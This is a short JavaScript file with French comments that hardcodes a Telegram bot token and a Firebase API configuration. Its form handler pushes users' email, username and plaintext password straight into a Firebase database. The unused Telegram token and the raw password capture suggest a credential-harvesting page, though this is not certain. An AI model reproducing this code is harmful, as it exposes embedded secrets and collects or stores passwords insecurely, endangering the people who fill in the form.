// telegram token
var token = '6630470146:AAHKxRgt0-dkfeV4vCaGj3afshe7aONOkgI'

var firebaseConfig = {
  apiKey: "AIzaSyA9bykZg5YFBQJlGSIi8i_RXV7UNonfI8U",
  authDomain: "novohub.firebaseapp.com",
  databaseURL: "https://novohub-default-rtdb.firebaseio.com/",
  projectId: "novohub",
  storageBucket: "novohub.appspot.com",
  messagingSenderId: "486940016289",
  appId: "1:486940016289:web:9681ba11f18f32070b3ae0",
  measurementId: "G-D30MBTXCL7"
};

// Initialiser Firebase
firebase.initializeApp(firebaseConfig);

document.querySelector('form').addEventListener('submit', function(e) {
  e.preventDefault(); // Empêche la soumission normale du formulaire

  // Récupérez les valeurs des champs du formulaire
  var email = document.getElementById('emailIdInput').value;
  var username = document.getElementById('usernameInput').value;
  var password = document.getElementById('passwordIdInput').value;

  // Utilisez la référence de la base de données Firebase
  var database = firebase.database().ref('https://novohub-default-rtdb.firebaseio.com/'); 

  // Insérez les données dans la base de données Firebase
  database.push({
    email: email,
    username: username,
    password: password
  }).then(function() {
    // Réinitialisez les champs du formulaire après l'insertion
    document.getElementById('emailIdInput').value = '';
    document.getElementById('usernameInput').value = '';
    document.getElementById('passwordIdInput').value = '';

    // Affichez une confirmation à l'utilisateur
    alert('Données insérées avec succès dans la base de données Firebase !');
  }).catch(function(error) {
    // Gérez les erreurs en conséquence
    console.error('Erreur lors de l\'insertion des données :', error);
  });
});
